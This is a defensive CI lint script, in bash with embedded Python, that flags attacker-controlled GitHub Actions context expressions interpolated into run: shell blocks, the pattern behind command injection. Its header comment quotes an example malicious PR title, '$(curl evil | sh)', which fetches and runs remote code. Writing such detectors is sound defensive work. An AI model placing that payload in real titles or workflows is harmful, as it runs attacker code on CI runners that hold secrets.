#!/usr/bin/env bash
# check-workflow-injection.sh — the GitHub Actions command-injection guard
# (issue #2656, epic #2636: mechanize recurring roborev blocker classes).
#
# GitHub Actions command injection is the top-severity recurring roborev BLOCKER
# class (see the pre-roborev self-check in CLAUDE.md and the roborev-findings
# doctrine page). The sink: an ATTACKER-CONTROLLED context expression
# (`${{ github.event.issue.title }}`, `${{ github.head_ref }}`, a commit message,
# …) interpolated DIRECTLY into a `run:` shell body. On a `pull_request_target`
# or issue/comment-triggered workflow the value is fully attacker-supplied, so a
# crafted PR title like `$(curl evil | sh)` executes in the runner — worst in a
# step that also holds secrets in `env:`.
#
# The fix pattern (doctrine): never inline `${{ }}` in `run:`; pass the value
# through a quoted `env:` var and, for the truly-untrusted contexts, allowlist-
# validate it fail-closed before any secret step.
#
# WHAT THIS FLAGS: an attacker-controlled `${{ ... }}` expression appearing inside
# a `run:` block body. The context allowlist below is deliberately the
# well-known attacker-controlled set (GitHub's own script-injection guidance) —
# NOT every `${{ }}`. `${{ env.* }}`, `${{ steps.*.outputs.* }}`,
# `${{ inputs.* }}` (workflow_dispatch, maintainer-supplied), and static config
# are NOT flagged: they are not attacker-controlled and inlining them, while not
# ideal, is not the injection blocker class this lint mechanizes. Keeping the set
# tight is what makes the lint fail-closed WITHOUT false-positiving on the ~31
# benign `${{ env.* }}`/dispatch-input interpolations already on main.
#
# Escape hatch (deliberate, reviewer-visible): put `injection-lint-allow` in a
# comment on the offending `run:` line or the line directly above it, with a
# one-line rationale. Use it only when the interpolated context is provably not
# attacker-controlled in the trigger set of that specific workflow.
#
# SKIP-aware, modelled on the sibling agent-gate guard scripts: no python3 -> SKIP
# (loud, never a silent PASS), so it is safe to wire into the gate on a stripped
# runner. Deterministic and fail-closed: any matching sink exits non-zero and
# names the offender.
#
# Usage:
#   scripts/ci/check-workflow-injection.sh [PATH...]
# With no args it scans .github/workflows. Explicit PATH args (files or dirs)
# override the roots — used by the self-test to point at planted fixtures.
set -euo pipefail

REPO_ROOT="$(cd "$(dirname "${BASH_SOURCE[0]}")/../.." && pwd)"

if ! command -v python3 >/dev/null 2>&1; then
  echo "SKIP: python3 unavailable (needed to scan workflows for injection sinks)"
  exit 0
fi

declare -a ROOTS=()
if [ "$#" -gt 0 ]; then
  ROOTS=("$@")
else
  [ -d "$REPO_ROOT/.github/workflows" ] && ROOTS+=("$REPO_ROOT/.github/workflows")
fi

if [ "${#ROOTS[@]}" -eq 0 ]; then
  echo "SKIP: no .github/workflows present (not a full checkout)"
  exit 0
fi

python3 - "${ROOTS[@]}" <<'PY'
import os, re, sys

roots = sys.argv[1:]

# Attacker-controlled context expressions (GitHub's script-injection guidance).
# ONLY these are flagged inside run: — deliberately NOT env./steps.*.outputs/
# inputs./static config, which are not attacker-supplied. Anchored on the context
# path so `github.event.pull_request.head.sha` (a 40-hex SHA, not injectable) is
# NOT flagged while `.head.ref`/`.head.label` (a branch name) IS.
DANGER = re.compile(r'''\$\{\{\s*(
      github\.event\.(issue|pull_request|comment|review|discussion)\.(title|body)
    | github\.event\.(issue|pull_request)\.user\.login
    | github\.event\.(pull_request|comment|review)\.[A-Za-z0-9_.]*\b(ref|label)\b
    | github\.event\.pull_request\.head\.repo\.[A-Za-z0-9_.]+
    | github\.head_ref
    | github\.event\.commits
    | github\.event\.head_commit\.(message|author)
    | github\.event\.workflow_run\.head_branch
    | github\.event\.pages
)''', re.VERBOSE)
ALLOW = 'injection-lint-allow'

def run_block_ranges(lines):
    """Yield (start_idx, end_idx) line ranges (0-based, inclusive) of every
    `run:` block body. A run: block body is everything more-indented than the
    `run:` key, until a line at or below that indent. Handles both `run: |`
    (block scalar) and `run: <inline>` forms."""
    i, n = 0, len(lines)
    while i < n:
        m = re.match(r'^(\s*)(-\s+)?run:\s*(.*)$', lines[i])
        if not m:
            i += 1
            continue
        indent = len(m.group(1)) + (len(m.group(2)) if m.group(2) else 0)
        # Fence on the `run:` KEY column (`indent`), not the `-` column. Step-level
        # sibling keys (`env:`, `if:`, `with:`) align at the key column, so a
        # `fence = len(m.group(1))` (the `-` indent) would swallow an `env:` block
        # written AFTER `run:` into the "run body" and false-positive on the exact
        # recommended safe pattern (attacker input passed via a quoted env: var).
        # Block-scalar body content is indented PAST the key column, so it is still
        # captured; a sibling key at the key column correctly terminates the body.
        fence = indent
        inline = m.group(3).strip()
        start = i
        j = i + 1
        while j < n:
            ln = lines[j]
            if ln.strip() == '':
                j += 1
                continue
            cur = len(ln) - len(ln.lstrip())
            if cur <= fence:
                break
            j += 1
        # body is [start .. j-1]; include the run: line itself for inline form
        yield (start, j - 1)
        i = j

violations = []
for root in roots:
    files = []
    if os.path.isfile(root):
        files = [root]
    else:
        for dp, _d, fs in os.walk(root):
            for f in fs:
                if f.endswith(('.yml', '.yaml')):
                    files.append(os.path.join(dp, f))
    for path in sorted(files):
        try:
            lines = open(path, encoding='utf-8').read().split('\n')
        except OSError:
            continue
        for start, end in run_block_ranges(lines):
            for k in range(start, min(end + 1, len(lines))):
                ln = lines[k]
                for mm in DANGER.finditer(ln):
                    # allow marker on this line or the line directly above
                    above = lines[k - 1] if k > 0 else ''
                    if ALLOW in ln or ALLOW in above:
                        continue
                    expr = mm.group(0)
                    violations.append((path, k + 1, expr))

if violations:
    print("FAIL: attacker-controlled ${{ }} context interpolated into a run: shell")
    print("      (GitHub Actions command injection — the top roborev BLOCKER class,")
    print("      issue #2656). Pass the value through a quoted env: var and")
    print("      allowlist-validate it fail-closed before any secret step; never")
    print("      inline an attacker-controlled ${{ }} in run:. See")
    print("      website agents-developing/roborev-findings.")
    print("      Provably-not-attacker-controlled here? mark it `injection-lint-allow`.")
    for path, line_no, expr in violations:
        rel = os.path.relpath(path)
        print(f"  {rel}:{line_no}: {expr}")
    sys.exit(1)

print("OK: no attacker-controlled ${{ }} interpolation in any run: shell")
PY
